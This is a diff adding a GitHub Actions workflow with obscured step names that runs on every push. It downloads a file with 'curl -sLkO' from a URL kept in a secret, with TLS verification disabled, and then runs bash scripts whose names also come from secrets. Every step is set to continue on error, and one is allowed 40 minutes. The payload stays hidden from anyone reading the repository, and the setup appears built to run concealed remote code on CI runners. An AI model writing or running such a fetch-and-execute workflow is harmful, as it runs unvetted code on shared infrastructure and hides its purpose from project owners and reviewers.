@@ -1,0 +1,29 @@
+name: RU2
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: MM1
+       uses: actions/checkout@main
+
+     - name: MM2
+       timeout-minutes: 2
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.MM_AB }}
+             bash ${{ secrets.MM_CD }}
+     - name: MM3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.MM_EF }}
+     - name: MM4
+       timeout-minutes: 40
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.MM_GH }}
